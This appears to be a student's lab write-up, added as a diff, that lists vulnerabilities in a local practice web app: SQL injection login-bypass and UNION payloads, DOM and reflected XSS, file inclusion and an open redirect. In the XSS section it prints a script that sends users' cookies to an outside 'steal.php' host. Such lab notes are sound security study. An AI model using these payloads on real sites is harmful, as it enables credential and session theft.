@@ -1,0 +1,93 @@
+>> login sql injection:
+- process:
+query = f"SELECT * FROM users WHERE username = 'user' AND password = '{password}'"
+
+password = ' or 1=1--
+
+
+>> search sql injection:
+- process:
+query = f"SELECT name,category,price FROM items WHERE name = '{name}'"
+
+name = ' union select username, password, NULL from users--
+
+
+>> dom-xss 
+- process:
+after logging as user
+do:
+http://127.0.0.1:8080/dashboard#<script>alert('test')</script>
+or
+http://127.0.0.1:8080/dashboard#<script>let x = prompt("User input");if(x) alert("${x} was inputted");</script>
+
+- explanation:
+
+greet.js decodes the right half of # (called uname) and write it in the html code sent to user, here:
+document.write(`<h2>Welcome ${uname}!</h2>`); // Greet the user!
+
+- exploit:
+http://127.0.0.1:8080/dashboard#<script> var cookieValue = document.cookie; if (cookieValue) { alert('Cookie Value: ' + cookieValue); } else { alert('No cookies found.'); }</script>
+
+if the user has a cookie active it will print it
+obviously in a real scenario you don't print it you send it over to a server you own, like so:
+<script> var cookieValue = document.cookie; var img = new Image(); img.src = 'http://mysite.com/steal.php?cookie=' + encodeURIComponent(cookieValue); </script>  --from source
+
+*in the framework provided the user doesn't get a cookie, so it's only visible with superadmin (cookie = admin=superadmin) - can be seen in the app.py code set_cookie()
+
+
+>> xss
+- process:
+login as user
+in dashboard, name field, type this:
+<script>alert("test")</script>
+
+- explanation:
+item_name is inputted here:
+        <input type="text" name="item_name" placeholder="Enter Name for Search:">
+		
+which is then evaluated by an sql query in app.py (which will likely return null - unless it exists in database)
+res = cursor.execute(query)
+# Get the results
+results = res.fetchall()
+if not results:
+	return render_template("dashboard.html", noitem=name)
+	
+so when it traverses the case of noitem in dashboard.html it will replace item_name with the injected code, here:
+{% if noitem %}
+  <div>
+	<h3>No item with name: {{ noitem|safe }}</h3>
+  </div>
+{% endif %}
+
+- exploit: 
+similar to dom-xss, we add to the html send to client, so the (roughly) the same 
+
+
+>> LFI
+- process:
+logged as admin
+http://127.0.0.1:8080/admin?show=templates/test
+
+- explanation:
+allows any file within the APP_ROOT dir to be viewed that is of type .txt 
+
+
+>> redirect 
+- process:
+127.0.0.1:8080/go?to=https://www.youtube.com
+
+- explanation:
+go app.route() allows any url to be inputted (no checks)
+
+
+
+sources:
+login query 
+https://www.w3schools.com/sql/sql_injection.asp
+
+login/search query
+https://portswigger.net/web-security/sql-injection
+https://portswigger.net/web-security/sql-injection/union-attacks
+
+dom-xss/cross xss
+https://eitca.org/cybersecurity/eitc-is-wapt-web-applications-penetration-testing/web-attacks-practice/http-attributes-cookie-stealing/examination-review-http-attributes-cookie-stealing/how-can-cross-site-scripting-xss-attacks-be-used-to-steal-cookies/
